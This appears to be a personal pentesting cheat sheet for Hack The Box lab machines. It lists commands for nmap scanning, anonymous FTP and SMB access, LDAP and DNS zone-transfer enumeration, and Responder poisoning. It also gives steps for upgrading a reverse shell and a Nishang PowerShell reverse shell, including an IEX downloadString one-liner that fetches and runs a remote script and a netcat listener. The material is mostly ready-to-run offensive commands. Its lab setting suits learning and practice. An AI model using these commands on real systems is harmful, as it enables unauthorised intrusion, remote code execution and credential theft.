
# NMAP
nmap -sC -sV -sT -oA NMAP/HTB 10.10.10.161

# FTP
ftp $targetip
Username: anonymous
Password: anything

# SMB
smbclient -N -L //10.10.10.161/
smbclient -N //10.10.10.161/Share
smbmap -H 10.10.10.161 -u anonymous -d HTB.LOCAL
smbmap -H 10.10.10.161 -u anonymous -d localhost
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html?fbclid=IwAR1qQDsLzkudInhrnUwL1V9ONiVXMD-vW1V5hrEI92xmuhlExEFOmyu_3xc#check-null-sessions

# LDAP
ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb" 

responder.py -I eth0 -w -f

-w : WPAD rogue server
-f : This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.

# DNS
nslookup
SERVER 10.10.10.161
- 127.0.0.1
- 10.10.10.161

dnsrecon -r 127.0.0.0/24 -n 10.10.10.161
dnsrecon -r 127.0.1.0/24 -n 10.10.10.161
dnsrecon -r 10.10.10.0/24 -n 10.10.10.161

dig axfr @10.10.10.161
dig axfr bank.htb @10.10.10.161

# Upgrading Reverse Shells to be Fully Interactive
python -c "import pty; pty.spawn('/bin/bash')"
Press Ctrl+Z to background your reverse shell, then in your local machine run: 
- stty raw -echo
- fg

Type reset and hit return. You should be presented with a fully interactive shell. You’re welcome.

There’s still one little niggling thing that can happen, the shell might not be the correct height/width for your terminal. To fix this, go to your local machine and run:

stty size

This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this command returned 48 120 Head on back to your victim box’s shell and run the following.

stty -rows 48 -columns 120

# Python SERVER

python -m simpleHTTPServer

# Windows nishang shell

Linux Site:

- gedit Invoke-PowerShellTcp.ps1 (Invoke-PowerShellTcp -Reverse -IPAdress 192.168.1.32 -Port 4444
- python -m SimpleHTTPServer
- nc -lvp 4444

Windows Site:

- C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')

# Privilige Escalation
https://guif.re/windowseop?fbclid=IwAR2fwsD6D7XjFhZbD4IGSTHtQkGs5D7HXEwVEnCYSQEDWzsuqds8geOi7uc#EoP%208:%20Kernel%20vulnerabilities

https://www.scip.ch/en/?labs.20181011

